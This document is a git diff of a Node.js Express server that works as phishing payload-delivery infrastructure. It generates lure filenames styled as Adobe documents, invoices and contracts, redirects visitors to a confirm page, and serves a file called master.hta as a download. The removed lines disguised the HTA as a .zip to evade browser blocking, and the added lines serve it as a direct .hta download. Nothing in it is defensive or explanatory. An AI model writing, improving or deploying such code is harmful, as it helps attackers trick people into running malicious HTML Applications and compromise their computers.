@@ -6,10 +6,7 @@ const fs = require('fs');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// ✅ CRITICAL: Dynamic routes MUST be defined BEFORE static middleware
-// This ensures /payload/:filename is handled by our custom route, not 404'd by static files
-
-// 1. THE BRIDGE - Generates unique filename and redirects
+// ✅ 1. BRIDGE - Generates unique .hta filename
 app.get('/bridge', (req, res) => {
     const randomId = crypto.randomInt(100000, 999999);
     const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
@@ -20,53 +17,48 @@ app.get('/bridge', (req, res) => {
     res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
 });
 
-// 2. THE PAYLOAD - Serves master.hta disguised as .zip
+// ✅ 2. PAYLOAD - Serves master.hta as DIRECT .hta DOWNLOAD
 app.get('/payload/:filename', (req, res) => {
     const filePath = path.join(__dirname, 'public', 'master.hta');
     
-    // Debug logging for Railway console
     console.log(`[PAYLOAD] Requested: ${req.params.filename}`);
-    console.log(`[PAYLOAD] Resolved path: ${filePath}`);
+    console.log(`[PAYLOAD] Serving from: ${filePath}`);
+    console.log(`[PAYLOAD] Exists: ${fs.existsSync(filePath)}`);
     
     if (!fs.existsSync(filePath)) {
-        console.error(`[PAYLOAD] ERROR: File not found at ${filePath}`);
-        return res.status(404).send('Payload source file missing.');
+        console.error('[PAYLOAD] master.hta NOT FOUND');
+        return res.status(404).send('Source file missing.');
     }
 
-    // Serve as .zip to bypass browser HTA blocking
-    const safeFilename = req.params.filename.replace('.hta', '.zip');
-    
-    console.log(`[PAYLOAD] Sending as: ${safeFilename}`);
-    
-    res.setHeader('Content-Disposition', `attachment; filename="${safeFilename}"`);
-    res.setHeader('Content-Type', 'application/zip');
+    // Serve with EXACT requested filename as .hta
+    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
+    res.setHeader('Content-Type', 'application/hta');
     res.setHeader('X-Content-Type-Options', 'nosniff');
     
     res.sendFile(filePath, (err) => {
         if (err) {
-            console.error(`[PAYLOAD] Send failed: ${err.message}`);
-            if (!res.headersSent) res.status(500).send('Download failed.');
+            console.error(`[PAYLOAD] Send error: ${err.message}`);
+            if (!res.headersSent) res.status(500).send('Failed');
         } else {
-            console.log(`[PAYLOAD] Success: ${safeFilename}`);
+            console.log(`[PAYLOAD] Sent: ${req.params.filename}`);
         }
     });
 });
 
-// 3. STATIC FILES - MUST BE AFTER dynamic routes
-app.use(express.static(path.join(__dirname, 'public')));
-
-// Health check endpoint
-app.get('/health', (req, res) => {
-    res.json({ status: 'ok', timestamp: new Date().toISOString() });
+// ✅ 3. SERVE ONLY SPECIFIC HTML FILES (NO blanket static middleware)
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Start server with error handling
-try {
-    app.listen(port, () => {
-        console.log(`✅ Server running on port ${port}`);
-        console.log(`🔗 Test bridge: http://localhost:${port}/bridge`);
-    });
-} catch (error) {
-    console.error('❌ Failed to start server:', error.message);
-    process.exit(1);
-}
+app.get('/confirm.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'confirm.html'));
+});
+
+// Health check
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok' });
+});
+
+app.listen(port, () => {
+    console.log(`✅ Server running on port ${port}`);
+});
